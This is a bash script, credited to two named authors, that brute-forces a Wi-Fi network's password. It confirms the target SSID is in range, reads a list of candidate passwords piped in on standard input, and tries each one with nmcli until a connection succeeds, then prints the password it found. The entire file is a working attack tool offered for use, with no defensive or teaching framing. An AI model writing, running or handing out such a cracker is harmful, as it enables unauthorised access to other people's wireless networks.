#!/bin/bash
#encoding: utf-8

#####################################################################################
#                                                                                   #
# [ Created At ]   : 24-02-2023                                                     #
# [ LastUpdate ]   : 24-02-2023                                                     #
# [ Description ]  : Crack wifi password by Brut-froce (Test each combination)      #
# [ Author(s) ]    : Mr MANI OMGBA(BUNEC) / NANFACK STEVE                           #
# [ email(s) ]     : gaelomgba4@gmail.com / nanfacksteve7@gmail.com                 #
#                                                                                   #
#####################################################################################

declare -a args=("$@")
SSID=$1
wait_Time=$2
state=false

# Color's Message
grn='\e[1;32m' && red='\e[1;31m' && blu='\e[1;96m' && wht='\e[1;97m' && ylw='\e[1;93m' && nc='\e[0m'

# Check if Wifi-SSID exist
[[ -z "$(nmcli device wifi list | egrep -o "$SSID")" ]] && echo -e "\n$red[ Error ]$nc : No Wifi named [$ylw $SSID $nc] found ! \n" && exit 1

#[[ -p /dev/stdin ]] && mapfile -t -O ${#args[@]} args && set -- "${args[@]}"
if [ -p /dev/stdin ]; then

  while read -r passwrd; do

    echo -e "$wht\nCheck this password : [$ylw $passwrd $nc]"
    nmcli -w $wait_Time device wifi connect $SSID password $passwrd >/dev/null 2>&1

    if [[ $? -ne 0 ]]; then
      echo -e "$red[ Error ]$nc : Incorrect password 😡, trying next one ...🤔"

    else
      echo -e "$grn\n[ OK ]$nc : 🔐 🤩 Passord found 🥳 🔓 ! [ $grn$passwrd $nc]\n"
      state=true
      break

    fi
  done < <(cat /dev/stdin) # read datas from pipe
fi

if [ $state = false ]; then echo -e "$wht\nSorry...😢 $ylw no password found on this range$nc. Try another \n"; fi
